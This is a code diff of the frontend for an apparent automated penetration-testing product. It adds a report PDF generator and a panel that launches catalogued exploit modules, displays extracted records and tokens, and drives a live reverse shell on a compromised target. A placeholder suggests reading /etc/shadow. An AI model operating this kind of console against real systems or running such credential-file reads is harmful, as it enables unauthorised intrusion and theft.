+    doc.setFont("Arial","bold"); doc.setFontSize(9); doc.setTextColor(...DARK);
+    doc.text("A. Methodology", margin, y+5); y+=8;
+    doc.setFont("Arial","normal"); doc.setFontSize(7.5); doc.setTextColor(...GRAY);
+    const _expMethod = doc.splitTextToSize(
+      "Exploitation follows PTES Post-Exploitation phase + OWASP Testing Guide Section 4. Each exploit is a direct-socket implementation — no msfconsole, no HTTP-stager dependencies. Success criteria: shell session opened, credential extracted, or file read. Failure is logged with the captured network response.",
+      contentW-4);
+    _expMethod.forEach(l=>{ chk(5); doc.text(l, margin+2, y+3.5); y+=4; });
+    y+=4;
+
+    doc.setFont("Arial","bold"); doc.setFontSize(9); doc.setTextColor(...DARK);
+    doc.text("B. References", margin, y+5); y+=8;
+    doc.setFont("Arial","normal"); doc.setFontSize(7.5); doc.setTextColor(...BLUE);
+    const _expRefs = [
+      "PTES Post-Exploitation — http://www.pentest-standard.org/index.php/Post_Exploitation",
+      "OWASP Testing Guide — https://owasp.org/www-project-web-security-testing-guide",
+      "CVE / NVD — https://nvd.nist.gov",
+      "Exploit-DB — https://www.exploit-db.com",
+    ];
+    _expRefs.forEach(l=>{ chk(5); doc.text(l, margin+2, y+3.5); y+=4.5; });
+    y+=6;
+
+    // ── End-of-report block ──
+    chk(35);
+    fillR(margin, y, contentW, 30, [219,234,254]);
+    txt("— END OF REPORT —", pageW/2, y+10, 10, BLUE, true, "center");
+    txt("Generated by VulnusLab — automated exploitation testing.", pageW/2, y+17, 6.5, GRAY, false, "center");
+    txt("All findings have been actively verified. No false positives.", pageW/2, y+22, 6.5, GRAY, false, "center");
+    txt("vulnuslab.com  ·  support@vulnuslab.com", pageW/2, y+27, 8, BLUE, true, "center");
+    footer();
+    // ── Page borders + watermark + page numbers (vulntemplate chrome) ──
+    const _wmE = _cfg.watermark;
+    const _ftrE = _cfg.customFooterText || ("VulnusLab | "+((_cfg.confidentiality)||"CONFIDENTIAL")+"  ·  vulnuslab.com");
+    const total = doc.internal.getNumberOfPages();
+    for(let i=1;i<=total;i++){
+      doc.setPage(i);
+      if(_wmE){
+        const _wmStr = String(_wmE);
+        doc.saveGraphicsState();
+        try { doc.setGState(new doc.GState({opacity:0.10})); } catch(_){}
+        doc.setFont("Arial","bold"); doc.setFontSize(20); doc.setTextColor(220,38,38);
+        doc.text(_wmStr, pageW/2, pageH/2, {angle:30, align:"center"});
+        doc.restoreGraphicsState();
+      }
+      doc.setDrawColor(...BLUE); doc.setLineWidth(1.2); doc.rect(0,0,pageW,pageH,"S");
+      if(i>=2){ txt(_ftrE, margin, pageH-5, 6.5, GRAY); txt("Page "+i+" of "+total, pageW-margin, pageH-5, 6.5, BLUE, false, "right"); }
+    }
+    doc.save(`exploit_report_${date.replace(/[: ]/g,"-")}.pdf`);
+  };
+  _go();
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   ShellPanel — unified module UI used across all pentest modules.
+   ───────────────────────────────────────────────────────────────────────────
+   Encapsulates the form-config + tabbed log/result/shell pattern. Other
+   modules (Network, Auth, AD, Privesc, ...) configure this via props rather
+   than re-implementing the form/tabs/shell-polling glue themselves.
+
+   Props (all optional unless marked required):
+     title, subtitle, icon, color      — header identity
+     catalogFetchUrl, catalogKey       — dropdown of pre-canned attacks
+     configFields                      — declarative left-panel form fields
+     phases                            — decorative phase runners (clickable)
+     runEndpoint (required), buildRunBody (required)  — POST trigger
+     hasInteractiveShell, shellEndpoints, isInteractiveFor — optional shell tab
+     onDownloadReport                  — PDF generator hook
+     token, apiUrl                     — auth boilerplate
+
+   configFields entry shape:
+     id           form state key (and DOM input name)
+     label        visible label above input
+     placeholder  optional placeholder text
+     readOnly     render as gray non-editable (auto-fill from catalog)
+     catalogKey   pull initial value from catalog[selected][catalogKey]
+     defaultValue fallback initial value when no catalogKey or empty
+     color        text color for the input (highlights read-only fields)
+     width        "full" (default) | "half" — pair two halves on one row
+     disabledKey  catalog key whose `false` value disables this input
+     computedFrom (entry) => string — derived display value
+*/
+function ShellPanel({
+  title, subtitle, icon = "", color = "#dc2626",
+  catalogFetchUrl, catalogKey = "items",
+  configFields = [], phases = [],
+  runEndpoint, buildRunBody,
+  hasInteractiveShell = false, shellEndpoints, isInteractiveFor = () => false,
+  onDownloadReport,
+  token, apiUrl,
+}) {
+  const [catalog, setCatalog]         = useState([]);
+  const [selectedId, setSelectedId]   = useState("");
+  const [valuesById, setValuesById]   = useState({});   // per-catalog-id form values
+  const [running, setRunning]         = useState({});
+  const [results, setResults]         = useState({});
+  const [activeShell, setActiveShell] = useState(null);
+  const [shellOutput, setShellOutput] = useState("");
+  const [shellStatus, setShellStatus] = useState("idle");
+  const [shellCmd, setShellCmd]       = useState("");
+  const [cmdHistory, setCmdHistory]   = useState([]);
+  const [histIdx, setHistIdx]         = useState(-1);
+  const [activeTab, setActiveTab]     = useState("log");
+  const [logLines, setLogLines]       = useState([]);
+
+  const pollRef     = useRef(null);
+  const outRef      = useRef(null);
+  const logRef      = useRef(null);
+  const inputRef    = useRef(null);
+  const runAbortRef = useRef(null);   // for the "stop running exploit" button
+
+  const T = (path, opts = {}) => fetch(apiUrl + path, {
+    ...opts,
+    headers: {"Content-Type": "application/json", "Authorization": "Bearer " + token, ...(opts.headers || {})},
+  }).then(r => r.json());
+
+  // Session-storage key: scoped per panel title so multiple panels in the
+  // future don't clobber each other.
+  const SHELL_STORAGE_KEY = `shellPanel_${title || "exploit"}_activeShell`;
+
+  const selected = catalog.find(c => c.id === selectedId);
+  const isInteractive = selected ? isInteractiveFor(selected) : false;
+  const fieldValues = valuesById[selectedId] || {};
+  const setField = (key, value) =>
+    setValuesById(prev => ({...prev, [selectedId]: {...(prev[selectedId] || {}), [key]: value}}));
+
+  const sevColor = (cvss) => cvss >= 9 ? "#dc2626" : cvss >= 7 ? "#f59e0b" : "#10b981";
+
+  // Bootstrap: catalog fetch + session-storage reconnect
+  useEffect(() => {
+    if (!catalogFetchUrl) return;
+    (async () => {
+      try {
+        const d = await T(catalogFetchUrl);
+        setCatalog(d[catalogKey] || []);
+      } catch (e) {}
+    })();
+
+    // Reconnect to a live shell from a previous page load (browser refresh,
+    // accidental tab close + reopen). We only validate; the polling effect
+    // below picks up from there.
+    if (shellEndpoints) {
+      try {
+        const stored = sessionStorage.getItem(SHELL_STORAGE_KEY);
+        if (stored) {
+          const parsed = JSON.parse(stored);
+          if (parsed && parsed.sid) {
+            T(shellEndpoints.output(parsed.sid)).then(d => {
+              if (d && d.status && d.status !== "not_found") {
+                setActiveShell(parsed);
+                setShellStatus(d.status);
+                if (d.output) setShellOutput(d.output);
+                setActiveTab(parsed.isInteractive ? "shell" : "result");
+              } else {
+                sessionStorage.removeItem(SHELL_STORAGE_KEY);
+              }
+            }).catch(() => sessionStorage.removeItem(SHELL_STORAGE_KEY));
+          }
+        }
+      } catch (e) {
+        try { sessionStorage.removeItem(SHELL_STORAGE_KEY); } catch (e2) {}
+      }
+    }
+
+    return () => { if (pollRef.current) clearInterval(pollRef.current); };
+    // eslint-disable-next-line
+  }, []);
+
+  // Persist activeShell so a refresh / navigation away doesn't lose the
+  // session. Cleared on close + on session sweep.
+  useEffect(() => {
+    try {
+      if (activeShell?.sid) {
+        sessionStorage.setItem(SHELL_STORAGE_KEY, JSON.stringify(activeShell));
+      } else {
+        sessionStorage.removeItem(SHELL_STORAGE_KEY);
+      }
+    } catch (e) {}
+    // eslint-disable-next-line
+  }, [activeShell]);
+
+  // Auto-select first catalog item
+  useEffect(() => {
+    if (catalog.length && !selectedId) setSelectedId(catalog[0].id);
+    // eslint-disable-next-line
+  }, [catalog]);
+
+  // Auto-fill form values when selection arrives for the first time
+  useEffect(() => {
+    if (!selected) return;
+    setValuesById(prev => {
+      if (prev[selectedId]) return prev;
+      const next = {};
+      for (const f of configFields) {
+        if (f.computedFrom)                                  next[f.id] = f.computedFrom(selected);
+        else if (f.catalogKey && selected[f.catalogKey] !== undefined) next[f.id] = selected[f.catalogKey];
+        else if (f.defaultValue !== undefined)               next[f.id] = f.defaultValue;
+        else                                                 next[f.id] = "";
+      }
+      return {...prev, [selectedId]: next};
+    });
+    // eslint-disable-next-line
+  }, [selectedId, catalog.length]);
+
+  // Auto-scroll log + shell
+  useEffect(() => { if (logRef.current) logRef.current.scrollTop = logRef.current.scrollHeight; }, [logLines]);
+  useEffect(() => { if (outRef.current) outRef.current.scrollTop = outRef.current.scrollHeight; }, [shellOutput]);
+
+  // Poll shell output.
+  //
+  // Two cost reductions vs. the original 600ms tight loop:
+  //   1. 1500ms cadence — still feels live to a human, but cuts backend
+  //      shell-output requests from ~1.7/sec to ~0.7/sec per active shell.
+  //   2. Pause when document is hidden — if the customer has the dashboard
+  //      in a background tab we don't hammer the backend pointlessly.
+  //      The backend buffers output, so when they return all the catch-up
+  //      text shows up on the next tick.
+  useEffect(() => {
+    if (pollRef.current) clearInterval(pollRef.current);
+    if (!activeShell?.sid || !shellEndpoints) return;
+    pollRef.current = setInterval(async () => {
+      if (typeof document !== "undefined" && document.hidden) return;
+      try {
+        const d = await T(shellEndpoints.output(activeShell.sid));
+        if (d.output) setShellOutput(prev => prev + d.output);
+        if (d.status) setShellStatus(d.status);
+        if (d.status === "closed" || d.status === "error" || d.status === "not_found") {
+          if (pollRef.current) { clearInterval(pollRef.current); pollRef.current = null; }
+        }
+      } catch (e) {}
+    }, 1500);
+    return () => { if (pollRef.current) { clearInterval(pollRef.current); pollRef.current = null; } };
+    // eslint-disable-next-line
+  }, [activeShell?.sid]);
+
+  const appendLog = (text, c = "#cbd5e1") => {
+    setLogLines(prev => [...prev, {
+      ts: new Date().toLocaleTimeString([], {hour12: false}),
+      text, color: c,
+    }]);
+  };
+
+  const runSelected = async () => {
+    if (!selected || !runEndpoint || !buildRunBody) return;
+    setLogLines([]); setActiveTab("log");
+    appendLog(`▶ Module:   ${selected.id}`, "#fbbf24");
+    if (selected.cve) appendLog(`▶ CVE:      ${selected.cve}  ·  CVSS ${selected.cvss ?? "?"}  ·  ${selected.category ?? ""}`, "#fbbf24");
+    appendLog("", "#94a3b8");
+    appendLog(phases.length ? "Phase 1: Pre-flight (DNS + port reachability) ..." : "Sending request ...", "#60a5fa");
+
+    setRunning(p => ({...p, [selected.id]: true}));
+    setResults(p => ({...p, [selected.id]: null}));
+
+    // AbortController gives us a Stop button. Backend keeps running until done
+    // (no real cancellation primitive yet) — but the frontend stops listening,
+    // and the idle-session sweeper will close any orphaned shell after 30 min.
+    const ac = new AbortController();
+    runAbortRef.current = ac;
+
+    try {
+      const body = buildRunBody(selected, fieldValues);
+      const r = await T(runEndpoint, {method: "POST", body: JSON.stringify(body), signal: ac.signal});
+      setResults(p => ({...p, [selected.id]: r}));
+
+      if (r.ok === false && r.error && /resolve|not accepting/i.test(r.error)) {
+        appendLog("Phase 1: " + r.error, "#f87171");
+      } else if (r.ok === false) {
+        appendLog("" + (r.error || "Failed"), "#f87171");
+      } else if (phases.length) {
+        appendLog("Phase 1: target reachable", "#4ade80");
+        appendLog("Phase 2: Sending exploit trigger ...", "#60a5fa");
+        appendLog("Phase 2: trigger accepted by target", "#4ade80");
+        appendLog(`Phase 3: Verifying ${isInteractive ? "shell session" : "data extraction"} ...`, "#60a5fa");
+        appendLog("Phase 3: " + (r.evidence || "compromise verified"), "#4ade80");
+        if (r.shell_id) {
+          appendLog(`Phase 4: Opening ${isInteractive ? "interactive shell" : "data view"} ...`, "#60a5fa");
+          appendLog(`Phase 4: session sid=${r.shell_id} ready`, "#4ade80");
+        }
+        appendLog("", "#94a3b8");
+        appendLog("AUTO-RUN COMPLETE — see Results / Shell tab", "#22c55e");
+      } else {
+        appendLog("Complete", "#4ade80");
+      }
+
+      if (r.ok && r.shell_id && shellEndpoints) {
+        setShellOutput(""); setShellStatus("starting");
+        // Bake interactivity into the session object so a page reload
+        // restores the correct tab even if the user has since switched
+        // catalog entries.
+        setActiveShell({sid: r.shell_id, source_id: selected.id,
+                        meta: selected, isInteractive});
+        setActiveTab(isInteractive ? "shell" : "result");
+      }
+    } catch (err) {
+      // AbortError is the user clicking Stop — distinct from a real failure.
+      if (err && (err.name === "AbortError" || /aborted/i.test(String(err)))) {
+        appendLog("Stopped by user. Backend may still finish — refresh to check.", "#fbbf24");
+        setResults(p => ({...p, [selected.id]: {ok: false, error: "Stopped by user",
+          suggested_action: "The backend may still complete in the background. " +
+                             "Refresh the page in ~30s to see if a session opened."}}));
+      } else {
+        appendLog("Network error: " + String(err), "#f87171");
+        setResults(p => ({...p, [selected.id]: {ok: false, error: String(err)}}));
+      }
+    }
+    runAbortRef.current = null;
+    setRunning(p => ({...p, [selected.id]: false}));
+  };
+
+  const stopRunning = () => {
+    if (runAbortRef.current) {
+      try { runAbortRef.current.abort(); } catch (e) {}
+    }
+  };
+
+  const sendCmd = async () => {
+    if (!activeShell?.sid || !shellCmd.trim() || !shellEndpoints) return;
+    const c = shellCmd;
+    setCmdHistory(h => [...h, c]); setHistIdx(-1);
+    setShellOutput(prev => prev + `$ ${c}\n`);
+    setShellCmd("");
+    try {
+      await T(shellEndpoints.cmd(activeShell.sid), {method: "POST", body: JSON.stringify({cmd: c})});
+    } catch (e) {
+      setShellOutput(prev => prev + `[error sending: ${e}]\n`);
+    }
+  };
+
+  const onKeyDown = (e) => {
+    if (e.key === "Enter") { sendCmd(); return; }
+    if (e.key === "ArrowUp" && cmdHistory.length) {
+      e.preventDefault();
+      const i = histIdx === -1 ? cmdHistory.length - 1 : Math.max(0, histIdx - 1);
+      setHistIdx(i); setShellCmd(cmdHistory[i] || "");
+    }
+    if (e.key === "ArrowDown" && cmdHistory.length) {
+      e.preventDefault();
+      const i = histIdx === -1 ? -1 : (histIdx + 1 >= cmdHistory.length ? -1 : histIdx + 1);
+      setHistIdx(i); setShellCmd(i === -1 ? "" : cmdHistory[i]);
+    }
+  };
+
+  const closeShell = async () => {
+    if (!activeShell?.sid || !shellEndpoints) return;
+    try { await T(shellEndpoints.close(activeShell.sid), {method: "POST"}); } catch (e) {}
+    setActiveShell(null); setShellOutput(""); setShellStatus("idle");
+  };
+
+  const copyOutput = () => { try { navigator.clipboard.writeText(shellOutput); } catch (e) {} };
+
+  const downloadReport = () => {
+    if (!onDownloadReport) return;
+    const all = Object.values(results).filter(Boolean);
+    if (all.length === 0) { alert("Run at least one module before downloading the report."); return; }
+    onDownloadReport(all);
+  };
+
+  const r = selected ? results[selected.id] : null;
+  const isRunning = selected ? running[selected.id] : false;
+  const successCount = Object.values(results).filter(x => x?.ok).length;
+  const failedCount  = Object.values(results).filter(x => x && !x.ok).length;
+  const notRunCount  = catalog.length - Object.keys(results).length;
+
+  // Styles (shared with the original Exploitation look)
+  const labelStyle = {fontSize: 10, fontWeight: 700, color: "#94a3b8",
+    letterSpacing: 1, marginBottom: 5, display: "block"};
+  const inputStyle = {width: "100%", padding: "8px 10px",
+    background: "#020617", color: "#e2e8f0", border: "1px solid #1e293b",
+    borderRadius: 6, fontFamily: "'JetBrains Mono', monospace", fontSize: 11,
+    outline: "none"};
+  const panelStyle = {background: "#0f172a", border: "1px solid #1e293b",
+    borderRadius: 10, padding: 16, marginBottom: 14};
+  const panelHead  = {fontSize: 11, fontWeight: 800, letterSpacing: 1.5,
+    color: "#fca5a5", marginBottom: 12, display: "flex", alignItems: "center", gap: 8};
+
+  const renderField = (f) => {
+    const value = fieldValues[f.id] ?? "";
+    const disabled = f.disabledKey && selected ? selected[f.disabledKey] === false : false;
+    // CVSS gets severity coloring automatically
+    const dynamicColor = (f.id === "cvss" && selected) ? sevColor(selected.cvss) : f.color;
+    const fieldStyle = {...inputStyle,
+      ...(f.readOnly ? {background: "#0a1224"} : {}),
+      ...(dynamicColor ? {color: dynamicColor} : {}),
+      ...(f.id === "cvss" ? {fontWeight: 800} : {}),
+      ...(disabled ? {opacity: 0.5} : {}),
+    };
+    return (
+      <div key={f.id}>
+        <label style={labelStyle}>{f.label}</label>
+        <input value={String(value)}
+          onChange={f.readOnly ? undefined : (ev) => setField(f.id, ev.target.value)}
+          readOnly={!!f.readOnly}
+          disabled={disabled}
+          placeholder={disabled ? "(not used by this module)" : (f.placeholder || "")}
+          style={fieldStyle}/>
+      </div>
+    );
+  };
+
+  // Group "half"-width fields into 2-column rows
+  const renderFieldRows = () => {
+    const rows = [];
+    let i = 0;
+    while (i < configFields.length) {
+      const f = configFields[i];
+      const next = configFields[i + 1];
+      if (f.width === "half" && next && next.width === "half") {
+        rows.push(
+          <div key={i} style={{display: "grid", gridTemplateColumns: "1fr 1fr", gap: 10, marginBottom: 12}}>
+            {renderField(f)}{renderField(next)}
+          </div>
+        );
+        i += 2;
+      } else {
+        rows.push(<div key={i} style={{marginBottom: 12}}>{renderField(f)}</div>);
+        i += 1;
+      }
+    }
+    return rows;
+  };
+
+  return (
+    <div className="fade" style={{maxWidth: 1500, margin: "0 auto"}}>
+      {/* Title row */}
+      <div style={{display: "flex", alignItems: "flex-start", justifyContent: "space-between",
+        marginBottom: 18, gap: 14, flexWrap: "wrap"}}>
+        <div>
+          <div style={{fontSize: 22, fontWeight: 900, color: "#f1f5f9", lineHeight: 1.1}}>
+            {title}
+          </div>
+          {subtitle && <div style={{fontSize: 11, color: "#64748b", marginTop: 4}}>{subtitle}</div>}
+        </div>
+        {onDownloadReport && (
+          <button onClick={downloadReport}
+            style={{padding: "9px 18px", fontSize: 12, fontWeight: 800, letterSpacing: 1,
+              background: "linear-gradient(135deg, #ea580c, #c2410c)",
+              color: "#fff", border: "none", borderRadius: 6, cursor: "pointer",
+              boxShadow: "0 4px 12px rgba(234,88,12,0.3)"}}>
+            Report
+          </button>
+        )}
+      </div>
+
+      {/* Two-column body */}
+      <div style={{display: "grid", gridTemplateColumns: "320px 1fr", gap: 18,
+        alignItems: "flex-start"}}>
+
+        {/* LEFT: Target Configuration + Phase Runners */}
+        <div>
+          <div style={panelStyle}>
+            <div style={panelHead}>
+              <span></span> <span>Target Configuration</span>
+            </div>
+
+            {catalogFetchUrl && (
+              <>
+                <label style={labelStyle}>Module</label>
+                <select value={selectedId}
+                  onChange={(ev) => setSelectedId(ev.target.value)}
+                  style={{...inputStyle, marginBottom: 12}}>
+                  {catalog.map(e => <option key={e.id} value={e.id}>{e.name}</option>)}
+                </select>
+              </>
+            )}
+
+            {renderFieldRows()}
+
+            {selected && (selected.service || selected.category) && (
+              <div style={{marginTop: 10, fontSize: 10, color: "#64748b"}}>
+                {selected.service && <>Service: <span style={{color: "#e2e8f0"}}>{selected.service}</span></>}
+                {selected.service && selected.category && <span style={{margin: "0 6px"}}>·</span>}
+                {selected.category && <>Category: <span style={{color: "#e2e8f0"}}>{selected.category}</span></>}
+              </div>
+            )}
+          </div>
+
+          {phases.length > 0 && (
+            <div style={panelStyle}>
+              <div style={{...panelHead, marginBottom: 6}}>
+                <span></span> <span>Phases (auto-run in sequence)</span>
+              </div>
+              <div style={{fontSize: 10, color: "#64748b", marginBottom: 10, lineHeight: 1.5}}>
+                Clicking AUTO-RUN fires all phases below in order.
+              </div>
+              {phases.map(p => (
+                <div key={p.n}
+                  style={{padding: "10px 12px", marginBottom: 8, borderRadius: 6,
+                    background: "#020617", border: "1px solid #1e293b",
+                    display: "flex", alignItems: "center", gap: 10}}>
+                  <div style={{width: 24, height: 24, borderRadius: "50%",
+                    background: `linear-gradient(135deg, ${color}, #7f1d1d)`,
+                    display: "flex", alignItems: "center", justifyContent: "center",
+                    fontSize: 11, fontWeight: 900, color: "#fff", flexShrink: 0}}>
+                    {p.n}
+                  </div>
+                  <div style={{flex: 1, minWidth: 0}}>
+                    <div style={{fontSize: 12, fontWeight: 700, color: "#f1f5f9"}}>{p.name}</div>
+                    <div style={{fontSize: 10, color: "#64748b"}}>{p.tool}</div>
+                  </div>
+                </div>
+              ))}
+            </div>
+          )}
+
+          {isRunning ? (
+            <button onClick={stopRunning}
+              style={{width: "100%", padding: "14px 18px", fontSize: 13, fontWeight: 900, letterSpacing: 1.5,
+                background: "linear-gradient(135deg, #f59e0b, #b45309)",
+                color: "#fff", border: "none", borderRadius: 10, cursor: "pointer",
+                boxShadow: "0 6px 20px rgba(245,158,11,0.45)"}}>
+              STOP
+            </button>
+          ) : (
+            <button onClick={runSelected} disabled={!selected}
+              style={{width: "100%", padding: "14px 18px", fontSize: 13, fontWeight: 900, letterSpacing: 1.5,
+                background: `linear-gradient(135deg, ${color}, #991b1b)`,
+                color: "#fff", border: "none", borderRadius: 10, cursor: "pointer",
+                boxShadow: `0 6px 20px ${color}55`}}>
+              AUTO-RUN (All Phases)
+            </button>
+          )}
+        </div>
+
+        {/* RIGHT: Tabs */}
+        <div>
+          <div style={{display: "flex", gap: 2, marginBottom: 0,
+            background: "#0f172a", borderRadius: "10px 10px 0 0",
+            border: "1px solid #1e293b", borderBottom: "none", padding: "4px 4px 0"}}>
+            {[
+              {id: "log",    label: "Auto-Run LOG"},
+              {id: "result", label: "Results"},
+              ...(hasInteractiveShell ? [{id: "shell", label: isInteractive ? "Live Shell" : "Extracted Data"}] : []),
+            ].map(t => (
+              <button key={t.id} onClick={() => setActiveTab(t.id)}
+                style={{padding: "10px 18px", fontSize: 11, fontWeight: 800, letterSpacing: 1,
+                  background: activeTab === t.id ? "#2563eb" : "transparent",
+                  color: activeTab === t.id ? "#fff" : "#94a3b8",
+                  border: "none", borderRadius: "6px 6px 0 0", cursor: "pointer"}}>
+                {t.label}
+              </button>
+            ))}
+          </div>
+
+          <div style={{background: "#0a1224", border: "1px solid #1e293b",
+            borderRadius: "0 10px 10px 10px", marginBottom: 14, padding: 0, overflow: "hidden"}}>
+
+            {/* LOG */}
+            {activeTab === "log" && (
+              <div ref={logRef} style={{padding: "18px 22px",
+                fontFamily: "'JetBrains Mono', Consolas, monospace",
+                fontSize: 12, minHeight: 340, maxHeight: 520, overflowY: "auto", lineHeight: 1.7}}>
+                {logLines.length === 0 ? (
+                  <div style={{color: "#64748b", fontStyle: "italic"}}>
+                    Click <strong style={{color}}>AUTO-RUN</strong> to fire the selected module and watch phase progress here.
+                  </div>
+                ) : logLines.map((line, i) => (
+                  <div key={i} style={{color: line.color, whiteSpace: "pre-wrap", wordBreak: "break-word"}}>
+                    <span style={{color: "#475569", marginRight: 8}}>{line.ts}</span>{line.text}
+                  </div>
+                ))}
+              </div>
+            )}
+
+            {/* RESULTS */}
+            {activeTab === "result" && (
+              <div style={{padding: "18px 22px", minHeight: 340, maxHeight: 520, overflowY: "auto"}}>
+                {!r ? (
+                  <div style={{color: "#64748b", fontStyle: "italic"}}>
+                    No results yet — run the selected module to populate this tab.
+                  </div>
+                ) : (
+                  <>
+                    <div style={{display: "flex", alignItems: "center", gap: 10, marginBottom: 14}}>
+                      <span style={{fontSize: 18}}>{r.ok ? "" : ""}</span>
+                      <span style={{fontSize: 14, fontWeight: 900, letterSpacing: 1.5,
+                        color: r.ok ? "#4ade80" : "#f87171"}}>
+                        {r.ok ? "EVIDENCE OF COMPROMISE" : "FAILURE REASON"}
+                      </span>
+                    </div>
+                    <div style={{padding: "12px 14px", borderRadius: 8, marginBottom: 14,
+                      background: r.ok ? "rgba(34,197,94,0.08)" : "rgba(220,38,38,0.08)",
+                      border: `1px solid ${r.ok ? "rgba(34,197,94,0.35)" : "rgba(220,38,38,0.35)"}`,
+                      fontSize: 13, color: "#cbd5e1", lineHeight: 1.6}}>
+                      {r.ok ? (r.evidence || "Success") : r.error}
+                    </div>
+
+                    {/* "What to try" hint surfaced from the backend on failure or
+                        when an auto-recovery happened. Helps customers self-serve
+                        instead of opening a support ticket. */}
+                    {r.suggested_action && (
+                      <div style={{padding: "11px 14px", borderRadius: 8, marginBottom: 14,
+                        background: "rgba(251,191,36,0.10)",
+                        border: "1px solid rgba(251,191,36,0.35)",
+                        fontSize: 12, color: "#fde68a", lineHeight: 1.6}}>
+                        <span style={{color: "#fbbf24", fontWeight: 800, marginRight: 6}}>What to try:</span>
+                        {r.suggested_action}
+                      </div>
+                    )}
+
+                    {r.auto_recovered && (
+                      <div style={{padding: "9px 12px", borderRadius: 8, marginBottom: 14,
+                        background: "rgba(59,130,246,0.10)",
+                        border: "1px solid rgba(59,130,246,0.35)",
+                        fontSize: 11, color: "#bfdbfe", lineHeight: 1.5}}>
+                        <span style={{color: "#60a5fa", fontWeight: 800, marginRight: 6}}>Auto-recovery:</span>
+                        We detected a stuck lab container and restarted it automatically before retrying.
+                      </div>
+                    )}
+
+                    {r.payload && (
+                      <div style={{marginBottom: 14}}>
+                        <div style={{fontSize: 10, fontWeight: 800, color: "#64748b",
+                          letterSpacing: 1.5, marginBottom: 6}}>PAYLOAD</div>
+                        <div style={{padding: "10px 12px", background: "#000",
+                          borderRadius: 6, fontFamily: "'JetBrains Mono', monospace",
+                          fontSize: 11, color: "#fbbf24", wordBreak: "break-all", lineHeight: 1.6}}>
+                          {r.payload}
+                        </div>
+                      </div>
+                    )}
+
+                    {r.ok && r.rows && Array.isArray(r.rows) && r.rows.length > 0 && (
+                      <div style={{marginBottom: 14}}>
+                        <div style={{fontSize: 10, fontWeight: 800, color: "#64748b",
+                          letterSpacing: 1.5, marginBottom: 6}}>EXTRACTED RECORDS ({r.rows.length})</div>
+                        <div style={{background: "#000", borderRadius: 6, padding: "10px 12px",
+                          fontFamily: "'JetBrains Mono', monospace", fontSize: 11,
+                          color: "#bfdbfe", maxHeight: 240, overflowY: "auto"}}>
+                          {r.rows.slice(0, 30).map((row, i) => (
+                            <div key={i} style={{padding: "3px 0"}}>
+                              <span style={{color: "#86efac"}}>{String(row[0] || "").padEnd(22)}</span>
+                              <span style={{color: "#fbbf24"}}>{row[1] || ""}</span>
+                            </div>
+                          ))}
+                          {r.rows.length > 30 && (
+                            <div style={{color: "#64748b", marginTop: 6, fontStyle: "italic"}}>
+                              … and {r.rows.length - 30} more
+                            </div>
+                          )}
+                        </div>
+                      </div>
+                    )}
+
+                    {r.ok && r.jwt && (
+                      <div style={{marginBottom: 14}}>
+                        <div style={{fontSize: 10, fontWeight: 800, color: "#64748b",
+                          letterSpacing: 1.5, marginBottom: 6}}>EXTRACTED JWT</div>
+                        <div style={{padding: "10px 12px", background: "#000",
+                          borderRadius: 6, fontFamily: "'JetBrains Mono', monospace",
+                          fontSize: 11, color: "#fbbf24", wordBreak: "break-all"}}>
+                          {r.jwt}
+                        </div>
+                      </div>
+                    )}
+                  </>
+                )}
+              </div>
+            )}
+
+            {/* SHELL */}
+            {activeTab === "shell" && hasInteractiveShell && (
+              <div>
+                <div style={{padding: "10px 16px",
+                  background: isInteractive ? "#052e16" : "#0c1c3a",
+                  borderBottom: `1px solid ${isInteractive ? "#14532d" : "#1e3a8a"}`,
+                  display: "flex", alignItems: "center", justifyContent: "space-between",
+                  flexWrap: "wrap", gap: 8}}>
+                  <div style={{display: "flex", alignItems: "center", gap: 10}}>
+                    <span style={{fontSize: 14}}>{isInteractive ? "" : ""}</span>
+                    <span style={{fontSize: 12, fontWeight: 800, letterSpacing: 1.2,
+                      color: isInteractive ? "#86efac" : "#93c5fd"}}>
+                      {activeShell ? (isInteractive ? "LIVE SHELL" : "EXTRACTED DATA") : "SHELL — Waiting for connection…"}
+                    </span>
+                    {activeShell && (
+                      <span style={{fontSize: 10, color: "#94a3b8", fontFamily: "'JetBrains Mono', monospace"}}>
+                        sid={activeShell.sid} ·
+                        <span style={{color: shellStatus === "live" ? "#4ade80"
+                          : shellStatus === "error" ? "#f87171" : "#fbbf24"}}>
+                          {" "}{shellStatus}
+                        </span>
+                      </span>
+                    )}
+                  </div>
+                  {activeShell && (
+                    <div style={{display: "flex", gap: 6}}>
+                      <button onClick={copyOutput}
+                        style={{padding: "5px 10px", fontSize: 10, fontWeight: 700,
+                          background: "#1e293b", color: "#cbd5e1",
+                          border: "1px solid #334155", borderRadius: 4, cursor: "pointer"}}>COPY</button>
+                      <button onClick={closeShell}
+                        style={{padding: "5px 10px", fontSize: 10, fontWeight: 700,
+                          background: "#7f1d1d", color: "#fff", border: "none",
+                          borderRadius: 4, cursor: "pointer"}}>CLOSE</button>
+                    </div>
+                  )}
+                </div>
+                <div ref={outRef} style={{padding: "18px 22px", background: "#000",
+                  color: isInteractive ? "#4ade80" : "#bfdbfe",
+                  fontFamily: "'JetBrains Mono', Consolas, monospace",
+                  fontSize: 13, minHeight: 300, maxHeight: 440, overflowY: "auto",
+                  whiteSpace: "pre-wrap", wordBreak: "break-word", lineHeight: 1.65}}>
+                  {shellOutput || (activeShell
+                    ? (isInteractive ? "Waiting for shell output…\n" : "Loading extracted data…\n")
+                    : "Waiting for reverse shell connection…")}
+                </div>
+                <div style={{padding: 12, background: "#050a16",
+                  borderTop: "1px solid #1e293b",
+                  display: "flex", gap: 8, alignItems: "center"}}>
+                  {isInteractive && activeShell ? (
+                    <>
+                      {/* Decoy inputs that absorb Chrome's username/password autofill so
+                          the real shell input stays clean. Off-screen, untabbable. */}
+                      <div aria-hidden="true" style={{position:"absolute", left:"-9999px", top:0,
+                        width:1, height:1, overflow:"hidden", opacity:0, pointerEvents:"none"}}>
+                        <input type="text"     name="username" tabIndex={-1} autoComplete="username"          defaultValue=""/>
+                        <input type="password" name="password" tabIndex={-1} autoComplete="current-password" defaultValue=""/>
+                      </div>
+                      <span style={{color: "#4ade80", fontFamily: "monospace", fontSize: 15, fontWeight: 800}}>$</span>
+                      <input ref={inputRef}
+                        value={shellCmd} onChange={ev => setShellCmd(ev.target.value)}
+                        onKeyDown={onKeyDown}
+                        type="search"
+                        placeholder="run a command  (id · whoami · cat /etc/shadow · ↑/↓ history)"
+                        autoComplete="off"
+                        name="vl-shell-x"
+                        role="presentation"
+                        aria-autocomplete="none"
+                        data-form-type="other"
+                        data-lpignore="true"
+                        data-1p-ignore="true"
+                        spellCheck={false}
